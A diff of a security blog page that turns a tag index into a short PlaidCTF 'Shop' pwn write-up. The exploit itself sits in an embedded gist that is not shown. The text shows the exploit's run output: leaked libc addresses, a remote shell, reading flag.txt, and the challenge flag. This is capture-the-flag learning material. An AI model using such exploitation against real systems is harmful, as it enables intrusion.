@@ -4,18 +4,27 @@
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
     <meta name="description" content="">
-    <meta property="og:title" content="Ctf">
+    <meta property="og:title" content="PlaidCTF: Shop (pwn)">
     
-    <meta property="og:type" content="website">
+    <meta property="og:type" content="article">
+    <meta property="article:published_time" content="2018-01-30">
     
     <meta property="og:description" content="">
-    <meta property="og:url" content="https://segflow.github.io/tags/ctf/">
+    <meta property="og:url" content="https://segflow.github.io/post/plaid-ctf-shop/">
     <meta property="og:site_name" content="Segflow">
     
+    <meta property="og:tags" content="writeup">
+    
+    <meta property="og:tags" content="ctf">
+    
+    <meta property="og:tags" content="pwn">
+    
     <meta name="generator" content="Hugo 0.40.2" />
-    <title>Ctf &middot; Segflow</title>
+    <title>PlaidCTF: Shop (pwn) &middot; Segflow</title>
     
     <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/styles/default.min.css">
     
     <link rel="stylesheet" href="https://segflow.github.io/css/style.css">
     
@@ -94,22 +103,68 @@
 			<div class="row">
 				<div id="post" class="col-sm-offset-1 col-sm-10 col-md-10 col-lg-10">
 
-<article>
+<main>
 	<header>
-		<h1>Ctf</a></h1>
+		<h1>PlaidCTF: Shop (pwn)</h1>
 	</header>
-<ul>
-	
-	<li><a href="https://segflow.github.io/post/acebear-ctf-secure_login/">AceBear CTF: Secure login (reverse)</a></li>
-	
-	<li><a href="https://segflow.github.io/post/plaid-ctf-shop/">PlaidCTF: Shop (pwn)</a></li>
-	
-	<li><a href="https://segflow.github.io/post/34c3-ctf-giftwrapper2/">34C3 CTF: GiftWrapper 2 (pwn)</a></li>
-	
-	<li><a href="https://segflow.github.io/post/3ds-ctf-xesar/">3DS CTF: Xesar (crypto)</a></li>
-	
-</ul>
-</article>
+
+	<article>
+		<p>Below you find the full exploit for PlaidCTF pwn200 task. Full write up will follow up.</p>
+
+<p></p>
+
+<script src="//gist.github.com/segflow/8118ae58bea31f36d83671c212ec6079.js"></script>
+
+<p>And we run it:</p>
+
+<pre><code class="language-shell">[+] Opening connection to shop.chal.pwning.xxx on port 9916: Done
+Stdout is at: 0x7f457d51d620
+Stdin is at: 0x7f457d51c8e0
+System is at: 0x7f457d19d390
+[*] Switching to interactive mode
+$ ls -la
+total 24
+drwxr-xr-x 2 root root  4096 May  5 01:33 .
+drwxr-xr-x 5 root root  4096 May  5 01:33 ..
+-rw-r----- 1 root shop    37 May  5 01:26 flag.txt
+-rwxr-s--- 1 root shop 10520 May  5 01:26 shop
+$ pwd
+/home/shop
+$ cat flag.txt
+PCTF{I_w3nt_sh0pp1ng_w1th_D3_8ruj1n}
+$ 
+</code></pre>
+
+<p>Flag: <strong>PCTF{I_w3nt_sh0pp1ng_w1th_D3_8ruj1n}</strong></p>
+	</article>
+</main>
+
+<div id="bottom-nav" class="text-center center-block">
+	<a href=" https://segflow.github.io/" class="btn btn-default"><i class="fa fa-home"></i> Home</a>
+</div>
+
+
+  <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "segflow-io" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
 
 						</div>
 					</div>
@@ -135,6 +190,8 @@
   <script src="//cdnjs.cloudflare.com/ajax/libs/d3/3.5.5/d3.min.js"></script>
   <script src="//cdnjs.cloudflare.com/ajax/libs/topojson/1.6.9/topojson.min.js"></script>
   
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
   
   <script src="https://segflow.github.io//js/App.js"></script>
   
